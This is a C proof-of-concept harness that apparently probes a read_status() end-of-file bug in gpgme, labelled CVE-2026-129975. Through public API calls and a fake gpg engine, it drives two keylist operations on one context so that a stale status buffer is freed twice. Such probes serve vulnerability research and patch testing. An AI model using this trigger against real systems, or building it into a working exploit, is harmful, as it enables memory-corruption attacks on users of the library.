/* Probe the read_status() EOF early return of CVE-2026-129975.
 *
 * Public APIs only.  Operation 1 feeds 1024 status bytes with no LF and
 * closes the pipe: with readpos=1024 the next read_status() reallocs at
 * engine-gpg.c:1494 and returns at :1519 on nread==0, before the pointer
 * writeback at :1610.  No callback returns an error.  Operation 2 reuses
 * the context; the stale buffer is freed again by _gpgme_op_reset.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_calls;

static gpgme_error_t
logging_status_cb (void *opaque, const char *keyword, const char *args)
{
  (void)opaque;
  cb_calls++;
  fprintf (stderr,
           "status_cb call=%d op_marker=%s keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           cb_calls, getenv ("FAKE_GPG_MARKER"), keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);
  return 0;
}

static void
do_keylist (gpgme_ctx_t ctx, int op)
{
  gpgme_key_t key;
  gpgme_error_t err;

  err = gpgme_op_keylist_start (ctx, NULL, 0);
  fprintf (stderr, "op%d keylist_start err=%s\n", op, gpgme_strerror (err));
  while (!err)
    {
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }
  fprintf (stderr, "op%d keylist_end err=%s cb_calls=%d\n",
           op, gpgme_strerror (err), cb_calls);
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_error_t err;
  const char *version;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_GPG_PATH\n", argv[0]);
      return 2;
    }
  version = gpgme_check_version (NULL);
  if (!version)
    return 2;
  fprintf (stderr, "gpgme version=%s\n", version);
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    return 2;
  err = gpgme_new (&ctx);
  if (err)
    return 2;
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  /* EOF_LEN lets the run script exercise the short-line control without
     recompiling; the default is the 1024-byte no-LF trigger.  */
  setenv ("FAKE_GPG_LEN", getenv ("EOF_LEN") ? getenv ("EOF_LEN") : "1024", 1);
  /* Operation 1: default 1024 bytes without LF, then EOF; no callback error.  */
  setenv ("FAKE_GPG_MARKER", "H", 1);
  do_keylist (ctx, 1);

  /* Operation 2: short line on the same context.  */
  setenv ("FAKE_GPG_LEN", "20", 1);
  setenv ("FAKE_GPG_MARKER", "Z", 1);
  do_keylist (ctx, 2);

  gpgme_release (ctx);
  puts ("release done");
  return 0;
}
